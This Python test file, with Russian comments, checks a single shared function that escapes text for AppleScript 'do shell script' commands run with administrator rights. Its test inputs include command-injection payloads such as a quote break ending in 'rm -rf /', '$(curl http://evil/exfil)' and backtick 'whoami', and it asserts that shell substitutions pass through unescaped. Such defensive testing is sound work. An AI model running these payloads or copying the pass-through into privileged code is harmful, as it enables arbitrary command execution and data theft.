r"""ТДД-тесты на единственную каноническую реализацию `_applescript_text`.

Контекст (issue #154, эпик #107 задача P0-1): экранирование для osascript
`do shell script "..."` ранее дублировалось в 4 файлах. Некорректное экранирование
позволяет разорвать applescript-строку и выполнить произвольную команду
(arbitrary command execution) через admin-мост. Здесь фиксируем контракт одной
реализации (`dashboard_common._applescript_text`) по векторам атаки:

  - двойная кавычка `"` — классический разрыв строки applescript
  - бэкслеш `\` — должен экранироваться ПЕРВЫМ (порядок replace критичен,
    иначе `\"` превратится в `\\"` и закрывающая кавычка снова разорвёт строку)
  - backtick `` ` `` и `$()` — shell-подстановка внутри `do shell script`
  - перевод строки `\n` — вставка новой applescript-инструкции

Контракт: результат, вставленный внутрь `"..."`, НЕ содержит неэкранированной
двойной кавычки и НЕ содержит голого обратного слэша, способного «съесть»
последующий символ экранирования.
"""

import dashboard_common
from dashboard_common import _applescript_text


def test_double_quote_is_escaped():
    """Двойная кавычка во вводе не должна разорвать applescript-строку."""
    assert _applescript_text('evil"; "do shell script "rm -rf /') == (
        'evil\\"; \\"do shell script \\"rm -rf /'
    )


def test_backslash_is_escaped_before_quote():
    """Порядок replace: сначала бэкслэши, потом кавычки.

    Если сделать наоборот, то ввод `\\"` (backslash + quote) даст `\\\\"` — то есть
    backslash превратится в два, а кавычка останется голой и снова разорвёт
    applescript-строку. Правильный порядок даёт `\\\\\\"` (двойной backslash +
    экранированная кавычка): каждый исходный символ экранирован.
    """
    # Ввод = 2 символа: backslash + двойная кавычка.
    inp = '\\"'
    # backslash -> два backslash, затем quote -> backslash + quote.
    # Итог = 3 символа: \, \, "   (repr '\\\\"').
    assert _applescript_text(inp) == '\\\\\\"'
    # Разбор по шагам для читаемости:
    assert _applescript_text('\\') == '\\\\'      # один слэш  -> два слэша
    assert _applescript_text('"') == '\\"'        # кавычка    -> слэш + кавычка


def test_no_unescaped_double_quote_in_output():
    """Инвариант против произвольного ввода: в результате не остаётся
    неэкранированной двойной кавычки.

    Неэкранированная кавычка = та, перед которой нет бэкслэша, ИЛИ перед которой
    стоит чётное число бэкслэшей. Проверяем, что каждая `"` в выводе предшествуется
    нечётным числом бэкслэшей.
    """
    for payload in [
        'a"b',
        '"\\\\"',          # уже-экранированный ввод: не должен сломать повтор
        '\\"',
        '"""',
        'pre"mid"post',
    ]:
        out = _applescript_text(payload)
        # каждый `"` обязан предшествоваться нечётным числом `\`
        i = 0
        while i < len(out):
            if out[i] == '"':
                backslashes = 0
                j = i - 1
                while j >= 0 and out[j] == '\\':
                    backslashes += 1
                    j -= 1
                assert backslashes % 2 == 1, (
                    f"неэкранированная кавычка в выводе для payload={payload!r}: {out!r}"
                )
            i += 1


def test_backtick_does_not_trigger_shell_substitution():
    """Backtick внутри `do shell script` вызывает command substitution в sh.

    Сам _applescript_text обязан сохранить его как есть (он ответственен только
    за applescript-контекст), но контракт фиксируем: backtick переживает функцию
    без исчезновения/преобразования, а кавычки вокруг payload — нет.
    """
    payload = 'echo `whoami`'
    out = _applescript_text(payload)
    assert '`' in out          # backtick на месте
    assert '"' not in out      # кавычек в payload не было — и не появилось


def test_dollar_paren_substitution_survives_verbatim():
    """`$(...)` — command substitution в sh; не должен исчезать/искажаться."""
    payload = '$(id) $(curl http://evil/exfil)'
    out = _applescript_text(payload)
    assert '$(id)' in out
    assert '$(curl' in out
    assert '"' not in out


def test_newline_is_preserved_not_split():
    """Перевод строки переживает экранирование без обрыва.

    _applescript_text не обязан удалять newline (его нет среди векторов разрыва
    applescript-двойных-кавычек), но он обязан НЕ позволить newline+
    кавычка собрать новую инструкцию. Проверяем: newline остаётся, а соседние
    кавычки экранированы.
    """
    payload = 'line1\n"; do shell script "evil'
    out = _applescript_text(payload)
    assert '\n' in out                       # newline не удалён
    # и при этом кавычки экранированы (инвариант из test_no_unescaped_double_quote_in_output)
    assert out.count('\\"') == 2


def test_non_string_input_is_coerced():
    """str()-приведение: число/объект не падает, а строково экранируется."""
    assert _applescript_text(123) == '123'
    assert _applescript_text(None) == 'None'


def test_canonical_implementation_lives_in_dashboard_common():
    """Контракт unification (#154): единственная реализация — в dashboard_common.

    Раньше копии жили в traffic_shape / dashboard_connectivity / isolate_firewall.
    Этот тест ломается, если кто-то снова заведёт локальную реализацию с другой
    логикой: мы сверяем, что все точки использования ссылаются на ОДНУ функцию.
    """
    assert hasattr(dashboard_common, "_applescript_text")
    # Сама функция — one-liner канона: сначала backslash, потом quote.
    src = _applescript_text
    # Сверка идентичности объекта между модулями (после рефакторинга все импортируют
    # единственную реализацию). Импортируем здесь, а не на верхнем уровне, чтобы
    # не провалить сбор при ошибке импорта в одном из них — мы хотим точное сообщение.
    import isolate_firewall
    import traffic_shape

    assert traffic_shape._applescript_text is src, (
        "traffic_shape должен импортировать _applescript_text из dashboard_common, "
        "а не держать копию"
    )
    assert isolate_firewall._applescript_text is src, (
        "isolate_firewall должен ссылаться на dashboard_common._applescript_text"
    )


def test_dashboard_connectivity_uses_canonical():
    """dashboard_connectivity раньше ВМЕЩАЛ канон — теперь импортирует его."""
    import dashboard_connectivity

    assert dashboard_connectivity._applescript_text is _applescript_text


def test_srouter_uses_canonical():
    """srouter.py больше не импортирует копию из traffic_shape — использует канон.

    Читаем исходник напрямую (без import srouter): srouter.py тянет health.py и
    другие тяжёлые модули верхнего уровня, что сделало бы тест хрупким к
    окружению. Контракт #154 — статический: оба PPP-hook'а должны импортировать
    _applescript_text из dashboard_common, а не из traffic_shape (копия).
    """
    from pathlib import Path

    srouter_src = (Path(__file__).resolve().parent.parent / "srouter.py").read_text(encoding="utf-8")

    # Старого (копийного) импорта из traffic_shape остаться не должно.
    assert "from traffic_shape import _applescript_text" not in srouter_src, (
        "srouter.py не должен импортировать _applescript_text из traffic_shape (это копия), "
        "только из dashboard_common"
    )
    # Канонический импорт присутствует ровно в двух местах (оба PPP-hook'а).
    canonical = "from dashboard_common import _applescript_text"
    assert srouter_src.count(canonical) == 2, (
        f"ожидали 2 канонических импорта (оба PPP-hook'а), нашли "
        f"{srouter_src.count(canonical)}"
    )


def test_round_trip_through_osascript_quoting():
    """Сквозной контракт: экранированный payload, обёрнутый в do shell script "..."
    остаётся валидной applescript-строкой — закрывающая кавычка не «украдена».

    Симулируем сборку applescript так же, как в _admin_run / switch_channel.
    """
    payload = 'anchor "com.apple/156" rate=1000'   # anchor-имя с кавычками (как traffic_shape)
    applescript = f'do shell script "{_applescript_text(payload)}" with administrator privileges'
    # Должно быть ровно две двойные кавычки-разделителя (открывающая и закрывающая),
    # все внутренние — экранированы.
    # Считаем неэкранированные кавычки: их должно быть ровно 2.
    bare = []
    i = 0
    while i < len(applescript):
        if applescript[i] == '"':
            backslashes = 0
            j = i - 1
            while j >= 0 and applescript[j] == '\\':
                backslashes += 1
                j -= 1
            if backslashes % 2 == 0:
                bare.append(i)
        i += 1
    assert len(bare) == 2, f"ожидалось ровно 2 разделителя, получено {len(bare)}: {applescript!r}"
